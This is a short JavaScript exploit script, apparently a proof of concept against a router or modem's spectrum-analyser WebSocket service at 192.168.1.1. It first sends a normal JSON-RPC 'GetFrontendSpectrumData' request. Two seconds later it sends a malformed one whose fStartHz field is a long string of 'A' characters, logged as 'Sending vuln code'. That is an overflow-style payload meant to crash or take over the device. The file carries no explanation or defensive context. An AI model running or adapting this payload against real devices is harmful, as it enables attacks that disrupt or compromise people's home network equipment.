const sleep = (milliseconds) => {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}

const doSomething = async () => {
  await sleep(2000)
  if (server_message != "") {
    e.send('{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + ',"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}'); console.log("Sending vuln code..")
  } else {
    console.log("TEST")
  }
}

console.log("Setting server_message");
server_message = "";

console.log("Opening websocket");
e = new WebSocket("ws://192.168.1.1:80/Frontend","rpc-frontend");

console.log("Setting up onmessage")
e.onmessage = function(e){
   server_message = e.data;
   console.log(server_message);
}

e.onopen = function(x){
  e.send('{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":0,"fStopHz":1218000000,"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}');
  console.log("Sending test code...");
  doSomething();
}
